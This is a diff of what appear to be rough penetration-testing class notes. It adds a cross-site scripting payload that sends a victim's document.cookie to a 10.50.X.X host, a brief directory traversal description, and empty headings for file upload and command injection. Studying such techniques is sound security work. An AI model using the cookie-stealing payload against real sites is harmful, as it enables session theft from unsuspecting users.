@@ -38,7 +38,6 @@ ssh -S /tmo/jump jump -O cancel -D9050
 
 ```
 
-
 # Penetration Testing 
 
 
@@ -141,6 +140,7 @@ curl 'https://web.site/submit.php' -H 'Cookie: name=123; settings=1,2,3,4,5,6,7'
 
 * changeText()
 
+* <script>document.location="http://10.50.X.X:8000/"+document.cookie;</script>
 
 
 ```
@@ -173,9 +173,28 @@ Burp suite (outside class)
 
 ```
 
+# Sever-Side injection 
+
+```
+Directory Traversal/Path Traversal
 
 
+Ability to read/execute outside web server’s directory
 
+Uses ../../ (relative paths) in manipulating a server-side file path
+
+
+```
+
+# Malicious 
+ile upload 
+
+
+# Command Injection 
+
+```
+
+```
 
 
 
